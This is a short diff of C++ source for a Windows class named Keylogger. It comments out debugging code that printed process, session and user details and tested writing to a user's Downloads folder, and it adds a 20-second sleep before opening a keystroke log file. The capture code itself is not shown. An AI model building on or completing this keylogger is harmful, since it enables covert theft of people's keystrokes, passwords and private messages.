@@ -4,41 +4,43 @@ std::ofstream Keylogger::kblog;
 wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
-    DWORD sessionId;
-    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
+    // DWORD sessionId;
+    // ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
 
-    std::cerr << "Process ID: " << GetCurrentProcessId() << '\n';
-    std::cerr << "Session ID: " << sessionId << '\n';
+    // std::cerr << "Process ID: " << GetCurrentProcessId() << '\n';
+    // std::cerr << "Session ID: " << sessionId << '\n';
 
-    wchar_t username[256];
-    DWORD size = 256;
+    // wchar_t username[256];
+    // DWORD size = 256;
 
-    if (GetUserNameW(username, &size)) {
-        std::wcout << L"Username: " << username << std::endl;
-    }
+    // if (GetUserNameW(username, &size)) {
+    //     std::wcout << L"Username: " << username << std::endl;
+    // }
 
-    HANDLE hFile = CreateFileW(
-        L"C:\\Users\\brennan\\Downloads\\kb_log.txt",
-        GENERIC_WRITE,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        NULL,
-        OPEN_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL
-    );
+    // HANDLE hFile = CreateFileW(
+    //     L"C:\\Users\\brennan\\Downloads\\kb_log.txt",
+    //     GENERIC_WRITE,
+    //     FILE_SHARE_READ | FILE_SHARE_WRITE,
+    //     NULL,
+    //     OPEN_ALWAYS,
+    //     FILE_ATTRIBUTE_NORMAL,
+    //     NULL
+    // );
 
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        std::cerr << "CreateFileW FAILED: "
-                  << GetLastError() << '\n';
-    }
-    else
-    {
-        std::cerr << "CreateFileW SUCCESS\n";
-        CloseHandle(hFile);
-    }
+    // if (hFile == INVALID_HANDLE_VALUE)
+    // {
+    //     std::cerr << "CreateFileW FAILED: "
+    //               << GetLastError() << '\n';
+    // }
+    // else
+    // {
+    //     std::cerr << "CreateFileW SUCCESS\n";
+    //     CloseHandle(hFile);
+    // }
 
-    errno = 0;
+    // errno = 0;
+
+    Sleep(20000);
 
     kblog = std::ofstream("kb_log.txt", std::ios::app);
 
